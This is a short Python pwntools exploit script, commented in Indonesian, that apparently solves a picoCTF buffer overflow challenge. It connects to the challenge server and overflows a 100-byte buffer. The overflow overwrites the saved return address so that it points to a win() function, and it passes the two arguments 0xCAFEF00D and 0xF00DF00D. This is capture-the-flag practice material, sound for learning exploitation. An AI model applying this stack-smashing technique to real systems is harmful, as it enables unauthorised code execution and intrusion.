import struct
from pwn import *

p = remote("saturn.picoctf.net", 51298)

win_addr = struct.pack("<I", 0x08049296)  # Alamat fungsi win()
arg1 = struct.pack("<I", 0xCAFEF00D)  # Argumen pertama
arg2 = struct.pack("<I", 0xF00DF00D)  # Argumen kedua

payload = b"A" * 100  # Mengisi buffer
payload += b"B" * 4    # Overwrite EBP (jika diperlukan)
payload += win_addr    # Overwrite return address
payload += b"C" * 4    # Placeholder untuk return address `win()`
payload += arg1        # Argumen pertama
payload += arg2        # Argumen kedua

print(payload)
p.sendline(payload)
p.interactive()
# with open("vuln", "wb") as f:
    # f.write(payload)
